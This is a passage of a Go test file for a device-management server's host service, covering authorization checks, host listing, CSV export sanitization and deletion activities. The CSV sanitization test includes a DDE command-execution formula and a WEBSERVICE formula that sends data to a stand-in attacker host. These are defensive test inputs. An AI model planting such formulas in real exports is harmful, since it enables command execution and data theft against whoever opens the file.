				checkAuthErr(t, tt.shouldFailTeamRead, err)
			}

			_, _, err = svc.ListHostUpcomingActivities(ctx, 1, automdm.ListOptions{})
			checkAuthErr(t, tt.shouldFailTeamRead, err)

			_, err = svc.GetHost(ctx, 2, opts)
			checkAuthErr(t, tt.shouldFailGlobalRead, err)

			_, err = svc.GetHostLite(ctx, 2)
			checkAuthErr(t, tt.shouldFailGlobalRead, err)

			for _, identifier := range []string{"2", "global-host"} {
				_, err = svc.GetHostByIDOrIdentifier(ctx, identifier, opts)
				checkAuthErr(t, tt.shouldFailGlobalRead, err)
			}

			_, _, err = svc.ListHostUpcomingActivities(ctx, 2, automdm.ListOptions{})
			checkAuthErr(t, tt.shouldFailGlobalRead, err)

			err = svc.DeleteHost(ctx, 1)
			checkHostWriteAuthErr(t, tt.shouldFailTeamWrite, isTeamOnlyRole && !belongsToTeam1, err)

			err = svc.DeleteHost(ctx, 2)
			checkHostWriteAuthErr(t, tt.shouldFailGlobalWrite, isTeamOnlyRole, err)

			err = svc.DeleteHosts(ctx, []uint{1}, nil)
			checkHostWriteAuthErr(t, tt.shouldFailTeamWrite, isTeamOnlyRole && !belongsToTeam1, err)

			err = svc.DeleteHosts(ctx, []uint{2}, nil)
			checkHostWriteAuthErr(t, tt.shouldFailGlobalWrite, isTeamOnlyRole, err)

			err = svc.AddHostsToTeam(ctx, new(uint(1)), []uint{1})
			checkAuthErr(t, tt.shouldFailTeamWrite, err)

			emptyFilter := make(map[string]interface{})
			err = svc.AddHostsToTeamByFilter(ctx, new(uint(1)), &emptyFilter)
			checkAuthErr(t, tt.shouldFailTeamWrite, err)

			err = svc.RefetchHost(ctx, 1)
			checkAuthErr(t, tt.shouldFailTeamRead, err)

			_, err = svc.SetHostDeviceMapping(ctx, 1, "a@b.c", "custom")
			checkAuthErr(t, tt.shouldFailTeamWrite, err)

			_, err = svc.SetHostDeviceMapping(ctx, 2, "a@b.c", "custom")
			checkAuthErr(t, tt.shouldFailGlobalWrite, err)

			_, _, err = svc.ListHostSoftware(ctx, 1, automdm.HostSoftwareTitleListOptions{})
			checkAuthErr(t, tt.shouldFailTeamRead, err)

			_, _, err = svc.ListHostSoftware(ctx, 2, automdm.HostSoftwareTitleListOptions{})
			checkAuthErr(t, tt.shouldFailGlobalRead, err)

			_, _, err = svc.ListHostCertificates(ctx, 1, automdm.ListOptions{})
			checkAuthErr(t, tt.shouldFailTeamRead, err)
			_, _, err = svc.ListHostCertificates(ctx, 2, automdm.ListOptions{})
			checkAuthErr(t, tt.shouldFailGlobalRead, err)
		})
	}

	// Technicians can delete hosts but have no other write access, so they
	// don't fit the read/write matrix above.
	technicianCases := []struct {
		name                   string
		user                   *automdm.User
		shouldFailTeamDelete   bool
		shouldFailGlobalDelete bool
	}{
		{"global technician", test.UserTechnician, false, false},
		{"team technician, belongs to team", test.UserTeamTechnicianTeam1, false, true},
		{"team technician, DOES NOT belong to team", test.UserTeamTechnicianTeam2, true, true},
	}
	premiumCtx := license.NewContext(ctx, &automdm.LicenseInfo{Tier: automdm.TierPremium})
	for _, tt := range technicianCases {
		t.Run(tt.name, func(t *testing.T) {
			ctx := viewer.NewContext(premiumCtx, viewer.Viewer{User: tt.user})
			isTeamOnlyRole := tt.user.GlobalRole == nil

			err := svc.DeleteHost(ctx, 1)
			checkHostWriteAuthErr(t, tt.shouldFailTeamDelete, isTeamOnlyRole, err)

			err = svc.DeleteHost(ctx, 2)
			checkHostWriteAuthErr(t, tt.shouldFailGlobalDelete, isTeamOnlyRole, err)

			err = svc.DeleteHosts(ctx, []uint{1}, nil)
			checkHostWriteAuthErr(t, tt.shouldFailTeamDelete, isTeamOnlyRole, err)

			err = svc.DeleteHosts(ctx, []uint{2}, nil)
			checkHostWriteAuthErr(t, tt.shouldFailGlobalDelete, isTeamOnlyRole, err)

			_, err = svc.SetHostDeviceMapping(ctx, 1, "a@b.c", "custom")
			checkAuthErr(t, true, err)
		})

		t.Run(tt.name+" on Free", func(t *testing.T) {
			ctx := viewer.NewContext(ctx, viewer.Viewer{User: tt.user})
			isTeamOnlyRole := tt.user.GlobalRole == nil
			checkFreeDelete := func(shouldFailAuthz bool, err error) {
				t.Helper()
				if shouldFailAuthz {
					checkHostWriteAuthErr(t, true, isTeamOnlyRole, err)
					return
				}
				require.ErrorIs(t, err, automdm.ErrMissingLicense)
			}

			checkFreeDelete(tt.shouldFailTeamDelete, svc.DeleteHost(ctx, 1))
			checkFreeDelete(tt.shouldFailGlobalDelete, svc.DeleteHost(ctx, 2))
			checkFreeDelete(tt.shouldFailTeamDelete, svc.DeleteHosts(ctx, []uint{1}, nil))
			checkFreeDelete(tt.shouldFailGlobalDelete, svc.DeleteHosts(ctx, []uint{2}, nil))
		})
	}

	// List, GetHostSummary work for all
}

func TestListHosts(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return []*automdm.Host{
			{ID: 1},
		}, nil
	}
	ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
		return make(map[uint]*automdm.HostLockWipeStatus), nil
	}

	userContext := test.UserContext(ctx, test.UserAdmin)
	hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{})
	require.NoError(t, err)
	require.Len(t, hosts, 1)

	// a user is required
	_, err = svc.ListHosts(ctx, automdm.HostListOptions{})
	require.Error(t, err)
	require.Contains(t, err.Error(), authz.ForbiddenErrorMessage)

	var shouldIncludeCVEScores bool
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		require.Equal(t, shouldIncludeCVEScores, includeCVEScores)
		return nil
	}

	// free license disallows getting vuln details
	hosts, err = svc.ListHosts(userContext, automdm.HostListOptions{PopulateSoftware: true, PopulateSoftwareVulnerabilityDetails: true})
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	require.True(t, ds.LoadHostSoftwareFuncInvoked)
	ds.LoadHostSoftwareFuncInvoked = false

	// you're allowed to skip vuln details on Premium
	userContext = license.NewContext(userContext, &automdm.LicenseInfo{Tier: automdm.TierPremium})
	hosts, err = svc.ListHosts(userContext, automdm.HostListOptions{PopulateSoftware: true, PopulateSoftwareVulnerabilityDetails: false})
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	require.True(t, ds.LoadHostSoftwareFuncInvoked)
	ds.LoadHostSoftwareFuncInvoked = false

	// you're allowed to retrieve vuln details on Premium
	shouldIncludeCVEScores = true
	hosts, err = svc.ListHosts(userContext, automdm.HostListOptions{PopulateSoftware: true, PopulateSoftwareVulnerabilityDetails: true})
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	require.True(t, ds.LoadHostSoftwareFuncInvoked)
}

func TestListHostsPopulateEndUsers(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return []*automdm.Host{{ID: 1}}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		require.EqualValues(t, 1, hostID)
		return &automdm.ScimUser{
			ExternalID: new("f26f8649"),
			UserName:   "anna@acme.com",
			GivenName:  new("Anna"),
			FamilyName: new("Chao"),
			Department: new("Product"),
			Groups:     []automdm.ScimUserGroup{{DisplayName: "Product"}, {DisplayName: "Designers"}},
		}, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		require.EqualValues(t, 1, id)
		return []*automdm.HostDeviceMapping{
			{HostID: 1, Email: "anna@example.com", Source: "google_chrome_profiles"},
		}, nil
	}

	userContext := test.UserContext(ctx, test.UserAdmin)

	hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{})
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	require.Nil(t, hosts[0].EndUsers)
	require.False(t, ds.ScimUserByHostIDFuncInvoked)
	require.False(t, ds.ListHostDeviceMappingFuncInvoked)

	hosts, err = svc.ListHosts(userContext, automdm.HostListOptions{PopulateEndUsers: true})
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	require.True(t, ds.ScimUserByHostIDFuncInvoked)
	require.True(t, ds.ListHostDeviceMappingFuncInvoked)

	require.Len(t, hosts[0].EndUsers, 1)
	endUser := hosts[0].EndUsers[0]
	assert.Equal(t, "f26f8649", endUser.IdpID)
	assert.Equal(t, "anna@acme.com", endUser.IdpUserName)
	assert.Equal(t, "Anna Chao", endUser.IdpFullName)
	assert.Equal(t, "Product", endUser.Department)
	assert.Equal(t, []string{"Product", "Designers"}, endUser.IdpGroups)
	require.Len(t, endUser.OtherEmails, 1)
	assert.Equal(t, "anna@example.com", endUser.OtherEmails[0].Email)

	// a host with no IdP user and no emails is still returned
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, newNotFoundError()
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	hosts, err = svc.ListHosts(userContext, automdm.HostListOptions{PopulateEndUsers: true})
	require.NoError(t, err)
	require.Len(t, hosts, 1)
	require.Empty(t, hosts[0].EndUsers)

	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, errors.New("scim boom")
	}
	_, err = svc.ListHosts(userContext, automdm.HostListOptions{PopulateEndUsers: true})
	require.ErrorContains(t, err, "scim boom")
}

func TestSanitizeCSVFormula(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		in   string
		want string
	}{
		{"empty", "", ""},
		{"equals", "=1+1", "'=1+1"},
		{"plus", "+SUM(1,1)", "'+SUM(1,1)"},
		{"minus", "-2+3", "'-2+3"},
		{"at", "@SUM(1,1)", "'@SUM(1,1)"},
		{"dde command", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
		{"webservice exfiltration", `=WEBSERVICE("http://evil.tld/?x="&A1)`, `'=WEBSERVICE("http://evil.tld/?x="&A1)`},
		{"tab", "\t=1+1", "'\t=1+1"},
		{"carriage return", "\r=1+1", "'\r=1+1"},
		{"hyphen leading text", "-laptop", "'-laptop"},
		{"leading space", " =1+1", "' =1+1"},
		{"leading spaces", "   @SUM(1,1)", "'   @SUM(1,1)"},
		{"newline then formula", "\n=1+1", "'\n=1+1"},

		// Values that must be left untouched.
		{"whitespace only", "   ", "   "},
		{"tab then text", "\tfoo", "\tfoo"},
		{"leading space then number", " -1", " -1"},
		{"trailing space after number", "-5 ", "-5 "},
		{"integer", "42", "42"},
		{"negative integer", "-1", "-1"},
		{"negative float", "-1.5", "-1.5"},
		{"positive sign", "+1", "+1"},
		{"negative exponent", "-1.5e10", "-1.5e10"},
		{"email", "user@example.com", "user@example.com"},
		{"timestamp", "2022-03-15T17:23:56Z", "2022-03-15T17:23:56Z"},
		{"hostname", "foo.local0", "foo.local0"},
		{"zero", "0", "0"},
		{"internal equals", "a=1+1", "a=1+1"},
		{"newline leading", "\nfoo", "\nfoo"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			require.Equal(t, c.want, sanitizeCSVFormula(c.in))
		})
	}

	t.Run("already sanitized values are left alone", func(t *testing.T) {
		t.Parallel()
		// The single quote is not a formula trigger, so re-applying the
		// transformation must not stack prefixes.
		once := sanitizeCSVFormula("=1+1")
		require.Equal(t, once, sanitizeCSVFormula(once))
	})
}

func TestHostsReportAutoMDMColumnsWithoutDeviceMapping(t *testing.T) {
	// Hosts without device mapping, as in an export that does not ask for it, still get the team columns.
	resp := hostsReportResponse{
		Columns: []string{"hostname", "team_name", "team_id"},
		Hosts:   []*automdm.HostResponse{{Host: &automdm.Host{Hostname: "h1", TeamID: new(uint(7)), TeamName: new("Workstations")}}},
	}
	rr := httptest.NewRecorder()
	resp.HijackRender(t.Context(), rr)
	require.Equal(t, http.StatusOK, rr.Code)
	rows, err := csv.NewReader(rr.Body).ReadAll()
	require.NoError(t, err)
	require.Equal(t, [][]string{{"hostname", "team_name", "team_id"}, {"h1", "Workstations", "7"}}, rows)
}

func TestStreamHosts(t *testing.T) {
	t.Run("Happy path", func(t *testing.T) {
		// Create a mock iterator for the hosts.
		hostIterator := func() iter.Seq2[*automdm.HostResponse, error] {
			return func(yield func(*automdm.HostResponse, error) bool) {
				for i := 1; i <= 3; i++ {
					host := &automdm.HostResponse{Host: &automdm.Host{ID: uint(i)}} // nolint:gosec
					if !yield(host, nil) {
						return
					}
				}
			}
		}
		resp := streamHostsResponse{
			HostResponseIterator: hostIterator(),
			listHostsResponse: listHostsResponse{
				Software: &automdm.Software{
					ID: uint(1),
				},
				SoftwareTitle: &automdm.SoftwareTitle{ID: uint(2)},
				MDMSolution: &automdm.MDMSolution{
					ID: uint(3),
				},
				MunkiIssue: &automdm.MunkiIssue{
					ID: uint(4),
				},
			},
		}
		rr := httptest.NewRecorder()
		resp.HijackRender(context.Background(), rr)
		require.Equal(t, rr.Code, 200)
		// Get the body into a string.
		body := rr.Body.String()
		// Unmarshal the string into a map.
		var results map[string]any
		err := json.Unmarshal([]byte(body), &results)
		if err != nil {
			t.Fatalf("failed to unmarshal response body: %v", err)
		}
		// Assert that software.id == 1
		require.Equal(t, float64(1), results["software"].(map[string]any)["id"])
		// Assert that software_title.id == 2
		require.Equal(t, float64(2), results["software_title"].(map[string]any)["id"])
		// Assert that mdm_solution.id == 3
		require.Equal(t, float64(3), results["mobile_device_management_solution"].(map[string]any)["id"])
		// Assert that munki_issue.id == 4
		require.Equal(t, float64(4), results["munki_issue"].(map[string]any)["id"])
		// Assert that hosts array has length 3
		hosts := results["hosts"].([]any)
		require.Len(t, hosts, 3)
		// Assert that host IDs are 1, 2, 3
		for i, host := range hosts {
			hostMap := host.(map[string]any)
			require.Equal(t, float64(i+1), hostMap["id"])
		}
		// Assert that the output contains no error message
		_, exists := results["error"]
		require.False(t, exists)
	})

	t.Run("Minimal data", func(t *testing.T) {
		// Create a mock iterator for the hosts.
		hostIterator := func() iter.Seq2[*automdm.HostResponse, error] {
			return func(yield func(*automdm.HostResponse, error) bool) {
				// Yield no hosts.
			}
		}
		resp := streamHostsResponse{
			HostResponseIterator: hostIterator(),
			listHostsResponse:    listHostsResponse{},
		}
		rr := httptest.NewRecorder()
		resp.HijackRender(context.Background(), rr)
		require.Equal(t, rr.Code, 200)
		// Get the body into a string.
		body := rr.Body.String()
		// Unmarshal the string into a map.
		var results map[string]any
		err := json.Unmarshal([]byte(body), &results)
		if err != nil {
			t.Fatalf("failed to unmarshal response body: %v", err)
		}
		_, ok := results["software"]
		require.False(t, ok)
		_, ok = results["software_title"]
		require.False(t, ok)
		_, ok = results["mobile_device_management_solution"]
		require.False(t, ok)
		_, ok = results["munki_issue"]
		require.False(t, ok)
		hosts := results["hosts"].([]any)
		require.Len(t, hosts, 0)
		// Assert that the output contains no error message
		_, exists := results["error"]
		require.False(t, exists)
	})

	errorTestCases := []struct {
		Name          string
		ExpectedError string
	}{
		{
			"Error marshalling Software",
			"marshaling software",
		},
		{
			"Error marshalling SoftwareTitle",
			"marshaling software_title",
		},
		{
			"Error marshalling MDMSolution",
			"marshaling mobile_device_management_solution",
		},
		{
			"Error marshalling MunkiIssue",
			"marshaling munki_issue",
		},
		{
			"Error iterating over Hosts",
			"getting host",
		},
		{
			"Error marshalling Hosts",
			"marshaling host response",
		},
	}
	for _, tc := range errorTestCases {
		t.Run(tc.Name, func(t *testing.T) {
			hostIterator := func() iter.Seq2[*automdm.HostResponse, error] {
				return func(yield func(*automdm.HostResponse, error) bool) {
					// Yield one good host.
					host := &automdm.HostResponse{Host: &automdm.Host{ID: uint(1)}}
					if !yield(host, nil) {
						return
					}
					if tc.Name == "Error iterating over Hosts" {
						// Yield an error immediately.
						yield(nil, errors.New("getting host"))
						return
					}
					host = &automdm.HostResponse{Host: &automdm.Host{ID: uint(2)}}
					if !yield(host, nil) {
						return
					}
				}
			}
			resp := streamHostsResponse{
				HostResponseIterator: hostIterator(),
				listHostsResponse: listHostsResponse{
					Software: &automdm.Software{
						ID: uint(1),
					},
					SoftwareTitle: &automdm.SoftwareTitle{ID: uint(2)},
					MDMSolution: &automdm.MDMSolution{
						ID: uint(3),
					},
					MunkiIssue: &automdm.MunkiIssue{
						ID: uint(4),
					},
				},
				MarshalJSON: func(v any) ([]byte, error) {
					switch v.(type) {
					case *automdm.Software:
						if tc.Name == "Error marshalling Software" {
							return nil, errors.New(`got some "error" marshaling {software}`)
						}
					case *automdm.SoftwareTitle:
						if tc.Name == "Error marshalling SoftwareTitle" {
							return nil, errors.New(`got some "error" marshaling {software title}`)
						}
					case *automdm.MDMSolution:
						if tc.Name == "Error marshalling MDMSolution" {
							return nil, errors.New(`got some "error" marshaling {mdm solution}`)
						}
					case *automdm.MunkiIssue:
						if tc.Name == "Error marshalling MunkiIssue" {
							return nil, errors.New(`got some "error" marshaling {munki issue}`)
						}
					case *automdm.HostResponse:
						if tc.Name == "Error marshalling Hosts" {
							return nil, errors.New(`got some "error" marshaling {host response}`)
						}
					}
					// Default to normal marshalling.
					return json.Marshal(v)
				},
			}
			rr := httptest.NewRecorder()
			resp.HijackRender(context.Background(), rr)
			// Assert that the output contains the error message
			require.Equal(t, rr.Code, 200)
			body := rr.Body.String()
			// Unmarshal the string into a map.
			var results map[string]any
			err := json.Unmarshal([]byte(body), &results)
			if err != nil {
				t.Fatalf("failed to unmarshal response body: %v", err)
			}
			// Assert that error message is present
			require.Contains(t, results["error"], tc.ExpectedError)
			// If the error isn't in the hosts array, ensure that no hosts were returned.
			hosts, ok := results["hosts"].([]any)
			if tc.Name != "Error marshalling Hosts" && tc.Name != "Error iterating over Hosts" {
				require.False(t, ok)
			} else {
				require.True(t, ok)
				if tc.Name == "Error iterating over Hosts" {
					require.Len(t, hosts, 1)
				} else {
					require.Len(t, hosts, 0)
				}
			}
		})
	}
}

func TestGetHostSummary(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.GenerateHostStatusStatisticsFunc = func(ctx context.Context, filter automdm.TeamFilter, now time.Time, platform *string, lowDiskSpace *int) (*automdm.HostSummary, error) {
		return &automdm.HostSummary{
			OnlineCount:        1,
			OfflineCount:       5, // offline hosts also includes mia hosts as of AutoMDM 4.15
			Missing30DaysCount: 3,
			NewCount:           4,
			TotalsHostsCount:   5,
			Platforms:          []*automdm.HostSummaryPlatform{{Platform: "darwin", HostsCount: 1}, {Platform: "debian", HostsCount: 2}, {Platform: "centos", HostsCount: 3}, {Platform: "ubuntu", HostsCount: 4}},
		}, nil
	}
	ds.LabelsSummaryFunc = func(ctx context.Context, filter automdm.TeamFilter) ([]*automdm.LabelSummary, error) {
		return []*automdm.LabelSummary{{ID: 1, Name: "All hosts", Description: "All hosts enrolled in AutoMDM", LabelType: automdm.LabelTypeBuiltIn}, {ID: 10, Name: "Other label", Description: "Not a builtin label", LabelType: automdm.LabelTypeRegular}}, nil
	}

	summary, err := svc.GetHostSummary(test.UserContext(ctx, test.UserAdmin), nil, nil, nil)
	require.NoError(t, err)
	require.Nil(t, summary.TeamID)
	require.Equal(t, uint(1), summary.OnlineCount)
	require.Equal(t, uint(5), summary.OfflineCount)
	require.Equal(t, uint(3), summary.Missing30DaysCount)
	require.Equal(t, uint(4), summary.NewCount)
	require.Equal(t, uint(5), summary.TotalsHostsCount)
	require.Len(t, summary.Platforms, 4)
	require.Nil(t, summary.LowDiskSpaceCount)
	require.Len(t, summary.BuiltinLabels, 1)
	require.Equal(t, "All hosts", summary.BuiltinLabels[0].Name)

	// a user is required
	_, err = svc.GetHostSummary(ctx, nil, nil, nil)
	require.Error(t, err)
	require.Contains(t, err.Error(), authz.ForbiddenErrorMessage)
}

func TestDeleteHost(t *testing.T) {
	ds := mysqltest.CreateMySQLDS(t)
	defer ds.Close()

	opts := &TestServerOpts{}
	svc, ctx := newTestService(t, ds, nil, nil, opts)

	user := &automdm.User{
		Name:       "Test User",
		Email:      "testuser@example.com",
		GlobalRole: new(automdm.RoleAdmin),
		Password:   []byte("password"),
		Salt:       "salt",
	}
	user, err := ds.NewUser(ctx, user)
	require.NoError(t, err)

	mockClock := clock.NewMockClock()

	t.Run("single", func(t *testing.T) {
		var cleanedHostIDs []uint
		opts.ActivityMock.CleanupHostActivitiesFuncInvoked = false
		opts.ActivityMock.CleanupHostActivitiesFunc = func(_ context.Context, hostIDs []uint) error {
			cleanedHostIDs = append(cleanedHostIDs, hostIDs...)
			return nil
		}

		host := test.NewHost(t, ds, "foo", "192.168.1.10", "1", "1", mockClock.Now())
		require.NotZero(t, host.ID)

		err := svc.DeleteHost(test.UserContext(ctx, user), host.ID)
		require.NoError(t, err)

		filter := automdm.TeamFilter{User: user}
		hosts, err := ds.ListHosts(ctx, filter, automdm.HostListOptions{})
		require.NoError(t, err)
		require.Empty(t, hosts)

		require.True(t, opts.ActivityMock.CleanupHostActivitiesFuncInvoked)
		require.Equal(t, []uint{host.ID}, cleanedHostIDs)
	})

	t.Run("bulk", func(t *testing.T) {
		var cleanedHostIDs []uint
		opts.ActivityMock.CleanupHostActivitiesFuncInvoked = false
		opts.ActivityMock.CleanupHostActivitiesFunc = func(_ context.Context, hostIDs []uint) error {
			cleanedHostIDs = append(cleanedHostIDs, hostIDs...)
			return nil
		}

		hostA := test.NewHost(t, ds, "hostA", "192.168.1.11", "2", "2", mockClock.Now())
		hostB := test.NewHost(t, ds, "hostB", "192.168.1.12", "3", "3", mockClock.Now())

		err := svc.DeleteHosts(test.UserContext(ctx, user), []uint{hostA.ID, hostB.ID}, nil)
		require.NoError(t, err)

		filter := automdm.TeamFilter{User: user}
		hosts, err := ds.ListHosts(ctx, filter, automdm.HostListOptions{})
		require.NoError(t, err)
		require.Empty(t, hosts)

		require.True(t, opts.ActivityMock.CleanupHostActivitiesFuncInvoked)
		require.ElementsMatch(t, []uint{hostA.ID, hostB.ID}, cleanedHostIDs)
	})
}

func TestDeleteHostDoesNotLeakOutOfScopeExistence(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	teamHost := &automdm.Host{ID: 1, TeamID: new(uint(1))}

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return teamHost, nil
	}

	// A team-scoped observer with no relationship to team 1 can neither read
	// nor write host 1: the response must be indistinguishable from a
	// nonexistent host (NotFound), not a Forbidden that would confirm the
	// host exists on some other team.
	outOfScopeUser := &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 2}, Role: automdm.RoleObserver}}}
	err := svc.DeleteHost(viewer.NewContext(ctx, viewer.Viewer{User: outOfScopeUser}), 1)
	require.Error(t, err)
	assert.True(t, automdm.IsNotFound(err))

	err = svc.DeleteHosts(viewer.NewContext(ctx, viewer.Viewer{User: outOfScopeUser}), []uint{1}, nil)
	require.Error(t, err)
	assert.True(t, automdm.IsNotFound(err))

	// A team-scoped observer who belongs to team 1 can read host 1, just not
	// write it: this must remain a normal Forbidden error, since no new
	// information about the host's existence is disclosed by it.
	inScopeObserver := &automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleObserver}}}
	err = svc.DeleteHost(viewer.NewContext(ctx, viewer.Viewer{User: inScopeObserver}), 1)
	require.Error(t, err)
	assert.False(t, automdm.IsNotFound(err))
	assert.Contains(t, err.Error(), authz.ForbiddenErrorMessage)
}

func TestDeleteHostCreatesActivity(t *testing.T) {
	ds := mysqltest.CreateMySQLDS(t)
	defer ds.Close()
	activitySvc := mysqltest.NewTestActivityService(t, ds)

	svc, ctx := newTestService(t, ds, nil, nil)
	svc.SetActivityService(activitySvc)

	// Create a user for the deletion
	user := &automdm.User{
		Name:       "Test User",
		Email:      "testuser@example.com",
		GlobalRole: new(automdm.RoleAdmin),
		Password:   []byte("password"),
		Salt:       "salt",
	}
	user, err := ds.NewUser(ctx, user)
	require.NoError(t, err)

	mockClock := clock.NewMockClock()
	host := test.NewHost(t, ds, "foo", "192.168.1.10", "1", "1", mockClock.Now())
	host.HardwareSerial = "ABC123"
	host.ComputerName = "Test Computer"
	err = ds.UpdateHost(ctx, host)
	require.NoError(t, err)

	// Get activities before deletion
	prevActivities := mysqltest.ListActivitiesAPI(t, ctx, activitySvc, activity_api.ListOptions{})

	// Delete the host
	err = svc.DeleteHost(test.UserContext(ctx, user), host.ID)
	require.NoError(t, err)

	// Verify the activity was created
	activities := mysqltest.ListActivitiesAPI(t, ctx, activitySvc, activity_api.ListOptions{
		OrderKey:       "id",
		OrderDirection: activity_api.OrderDescending,
		PerPage:        1,
	})
	require.Len(t, activities, 1)
	require.Greater(t, len(activities), len(prevActivities)-1)

	activity := activities[0]
	expectedActivityType := automdm.ActivityTypeDeletedHost{}.ActivityName()
	require.Equal(t, expectedActivityType, activity.Type)
	require.NotNil(t, activity.Details)

	var details automdm.ActivityTypeDeletedHost
	err = json.Unmarshal(*activity.Details, &details)
	require.NoError(t, err)
	require.Equal(t, host.ID, details.HostID)
	require.Equal(t, "Test Computer", details.HostDisplayName)
	require.Equal(t, "ABC123", details.HostSerial)
	require.Equal(t, automdm.DeletedHostTriggeredByManual, details.TriggeredBy)
}

func TestDeleteHostsCreatesActivities(t *testing.T) {
	ds := mysqltest.CreateMySQLDS(t)
	defer ds.Close()
	activitySvc := mysqltest.NewTestActivityService(t, ds)

	svc, ctx := newTestService(t, ds, nil, nil)
	svc.SetActivityService(activitySvc)

	// Create a user for the deletion
	user := &automdm.User{
		Name:       "Test User",
		Email:      "testuser@example.com",
		GlobalRole: new(automdm.RoleAdmin),
		Password:   []byte("password"),
		Salt:       "salt",
	}
	user, err := ds.NewUser(ctx, user)
	require.NoError(t, err)

	mockClock := clock.NewMockClock()

	// Create multiple hosts
	host1 := test.NewHost(t, ds, "host1", "192.168.1.10", "1", "1", mockClock.Now())
	host1.HardwareSerial = "SERIAL1"
	host1.ComputerName = "Computer 1"
	err = ds.UpdateHost(ctx, host1)
	require.NoError(t, err)

	host2 := test.NewHost(t, ds, "host2", "192.168.1.11", "2", "2", mockClock.Now())
	host2.HardwareSerial = "SERIAL2"
	host2.ComputerName = "Computer 2"
	err = ds.UpdateHost(ctx, host2)
	require.NoError(t, err)

	// Get activities before deletion
	prevActivities := mysqltest.ListActivitiesAPI(t, ctx, activitySvc, activity_api.ListOptions{})

	// Delete the hosts
	err = svc.DeleteHosts(test.UserContext(ctx, user), []uint{host1.ID, host2.ID}, nil)
	require.NoError(t, err)

	// Verify activities were created
	activities := mysqltest.ListActivitiesAPI(t, ctx, activitySvc, activity_api.ListOptions{
		OrderKey:       "id",
		OrderDirection: activity_api.OrderDescending,
		PerPage:        10,
	})
	require.GreaterOrEqual(t, len(activities), 2)

	// Verify we have at least 2 more activities than before
	require.Greater(t, len(activities), len(prevActivities)-1)

	// Check the first two activities are for deleted hosts
	expectedActivityType := automdm.ActivityTypeDeletedHost{}.ActivityName()
	for i := 0; i < 2; i++ {
		activity := activities[i]
		require.Equal(t, expectedActivityType, activity.Type)
		require.NotNil(t, activity.Details)

		var details automdm.ActivityTypeDeletedHost
		err = json.Unmarshal(*activity.Details, &details)
		require.NoError(t, err)
		require.Contains(t, []uint{host1.ID, host2.ID}, details.HostID)
		require.Contains(t, []string{"Computer 1", "Computer 2"}, details.HostDisplayName)
		require.Contains(t, []string{"SERIAL1", "SERIAL2"}, details.HostSerial)
		require.Equal(t, automdm.DeletedHostTriggeredByManual, details.TriggeredBy)
	}
}

func TestCleanupExpiredHostsActivities(t *testing.T) {
	ds := mysqltest.CreateMySQLDS(t)
	defer ds.Close()
	activitySvc := mysqltest.NewTestActivityService(t, ds)

	opts := &TestServerOpts{}
	svc, ctx := newTestService(t, ds, nil, nil, opts)

	// Use the mock with delegation so we can track CleanupHostActivities calls.
	var cleanedHostIDs []uint
	opts.ActivityMock.Delegate = activitySvc
	opts.ActivityMock.CleanupHostActivitiesFunc = func(ctx context.Context, hostIDs []uint) error {
		cleanedHostIDs = append(cleanedHostIDs, hostIDs...)
		return activitySvc.CleanupHostActivities(ctx, hostIDs)
	}

	// Set global host expiry
	const globalExpiryWindow = 10
	const team1ExpiryWindow = 5
	const team2ExpiryWindow = 15

	ac, err := ds.AppConfig(ctx)
	require.NoError(t, err)
	ac.HostExpirySettings.HostExpiryEnabled = true
	ac.HostExpirySettings.HostExpiryWindow = globalExpiryWindow
	err = ds.SaveAppConfig(ctx, ac)
	require.NoError(t, err)

	// Create Team 1 with custom expiry window
	team1, err := ds.NewTeam(ctx, &automdm.Team{Name: "team1"})
	require.NoError(t, err)
	team1.Config.HostExpirySettings.HostExpiryEnabled = true
	team1.Config.HostExpirySettings.HostExpiryWindow = team1ExpiryWindow
	_, err = ds.SaveTeam(ctx, team1)
	require.NoError(t, err)

	// Create Team 2 with different custom expiry window
	team2, err := ds.NewTeam(ctx, &automdm.Team{Name: "team2"})
	require.NoError(t, err)
	team2.Config.HostExpirySettings.HostExpiryEnabled = true
	team2.Config.HostExpirySettings.HostExpiryWindow = team2ExpiryWindow
	_, err = ds.SaveTeam(ctx, team2)
	require.NoError(t, err)

	// Create Team 3 that uses global expiry (no custom setting)
	team3, err := ds.NewTeam(ctx, &automdm.Team{Name: "team3"})
	require.NoError(t, err)
	// team3 does not have custom host expiry settings, so it uses global

